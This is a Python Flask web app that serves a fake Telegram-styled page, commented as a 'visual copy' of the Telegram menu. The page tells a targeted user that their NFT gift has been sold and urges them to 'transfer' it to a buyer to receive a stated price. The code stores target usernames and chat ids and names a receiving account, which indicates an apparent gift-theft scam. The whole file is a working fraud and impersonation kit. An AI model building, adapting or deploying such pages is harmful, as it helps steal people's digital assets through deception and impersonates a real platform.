# language: Python 3.12, file: app.py
import os
import time
import uuid
import sqlite3
import html
from flask import Flask, request, render_template_string, jsonify, abort

DB = os.getenv("DB_PATH", "/data/offers.db")
BASE_URL = os.getenv("WEBAPP_BASE", "http://localhost:8080")
RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
flask_app = Flask(__name__)

_db_dir = os.path.dirname(DB) or "."
try:
    os.makedirs(_db_dir, exist_ok=True)
except Exception:
    DB = "offers.db"

def db():
    c = sqlite3.connect(DB, timeout=30, check_same_thread=False)
    c.row_factory = sqlite3.Row
    return c

def init_db():
    with db() as c:
        c.execute("""CREATE TABLE IF NOT EXISTS offers (
            id TEXT PRIMARY KEY, nft_name TEXT NOT NULL, nft_slug TEXT,
            price TEXT NOT NULL, buyer TEXT, target_user TEXT,
            target_chat_id INTEGER, created INTEGER NOT NULL,
            expires INTEGER NOT NULL, status TEXT DEFAULT 'pending'
        )""")

init_db()

def make_offer(nft_name, nft_slug, price, buyer, target_user, target_chat_id, offer_id=None):
    oid = offer_id if offer_id else uuid.uuid4().hex[:12]
    now = int(time.time())
    ttl = int(os.getenv("OFFER_TTL_HOURS", "6")) * 3600
    with db() as c:
        c.execute("DELETE FROM offers WHERE id=?", (oid,))
        c.execute(
            "INSERT INTO offers(id,nft_name,nft_slug,price,buyer,target_user,"
            "target_chat_id,created,expires) VALUES(?,?,?,?,?,?,?,?,?)",
            (oid, nft_name, nft_slug, price, buyer, target_user,
             target_chat_id, now, now + ttl))
    return oid

def get_offer(oid):
    with db() as c:
        r = c.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
        return dict(r) if r else None

def set_status(oid, st):
    with db() as c:
        c.execute("UPDATE offers SET status=? WHERE id=?", (st, oid))

# ---------- HTML (ВИЗУАЛЬНАЯ КОПИЯ МЕНЮ) ----------
CARD_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Telegram</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  :root { --bg: #17212b; --text: #fff; }
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
  body { background: var(--bg); color: var(--text); min-height: 100vh; display: flex; justify-content: center; }
  .container { width: 100%; max-width: 400px; padding: 20px 15px; }
  .header { display: flex; align-items: center; margin-bottom: 20px; font-size: 17px; font-weight: 500; cursor: pointer; }
  .header svg { width: 24px; height: 24px; fill: #fff; margin-right: 10px; }
  .gift-card { background: #fff; border-radius: 12px; overflow: hidden; margin-bottom: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
  .gift-card img { width: 100%; display: block; aspect-ratio: 1/1; object-fit: cover; }
  .btn-show { width: 100%; padding: 14px; text-align: center; color: #2481cc; font-weight: 600; font-size: 16px; background: #fff; border-top: 1px solid #eee; cursor: pointer; }
  .text-block { font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
  .text-block b { font-weight: 600; }
  .btn-green { background: #4dcd5e; color: #fff; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; margin-bottom: 12px; }
  .btn-gray { background: rgba(255,255,255,0.1); color: #fff; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; }
</style>
</head>
<body>
<script>
  if (window.Telegram && Telegram.WebApp) { Telegram.WebApp.ready(); Telegram.WebApp.expand(); Telegram.WebApp.setHeaderColor('#17212b'); }
</script>
<div class="container">
  <div class="header" onclick="window.Telegram.WebApp.close()">
    <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
    Назад
  </div>
  <div class="gift-card">
    <img src="https://t.me/i/nft/{{ slug }}.png" onerror="this.src='https://telegram.org/img/t_logo.png';">
    <div class="btn-show">ПОКАЗАТЬ ПОДАРОК</div>
  </div>
  <div class="text-block">
    🎁 <b>Подарок: {{ nft_name }}</b><br>
    успешно продан!<br><br>
    Передайте подарок покупателю для зачисления <b>{{ price }}</b>.
  </div>
  <button class="btn-green" onclick="onTransfer()">Передать NFT</button>
  <button class="btn-gray" onclick="alert('Откройте подарок, нажмите "Передать" и следуйте инструкциям.')">Как передать?</button>
</div>
<script>
  function onTransfer() {
    window.location.href = "https://t.me/nft/{{ slug }}";
  }
</script>
</body></html>
"""

@flask_app.route("/offer/<oid>")
def view_offer(oid):
    o = get_offer(oid)
    if not o: abort(404)
    return render_template_string(
        CARD_HTML, oid=oid, nft_name=html.escape(o["nft_name"]),
        slug=o["nft_slug"] or "", price=html.escape(o["price"])
    )

@flask_app.route("/api/accept/<oid>", methods=["POST"])
def api_accept(oid):
    set_status(oid, "accepted")
    return jsonify({"ok": True})

@flask_app.route("/")
def index():
    return "ok", 200

if __name__ == "__main__":
    flask_app.run(host="0.0.0.0", port=int(os.getenv("PORT", "8080")))
